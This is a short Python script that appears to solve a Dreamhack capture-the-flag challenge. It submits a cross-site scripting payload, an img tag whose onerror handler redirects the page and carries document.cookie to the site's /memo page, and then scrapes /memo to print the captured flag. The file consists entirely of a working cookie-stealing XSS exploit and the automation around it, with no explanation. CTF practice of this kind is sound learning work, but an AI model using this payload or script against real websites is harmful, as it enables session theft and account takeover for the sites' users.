from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:17613"
FLAG_URI = "/flag"
MEMO_URI = "/memo"
PAYLOAD = '''<img src="x" onerror="location.href='/memo?memo='+document.cookie">'''
DATA = {'param': PAYLOAD}

# 1. GET FLAG
requests.post(URL + FLAG_URI, data=DATA)

# 2. PRINT RLAG
resp = requests.get(URL + MEMO_URI)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)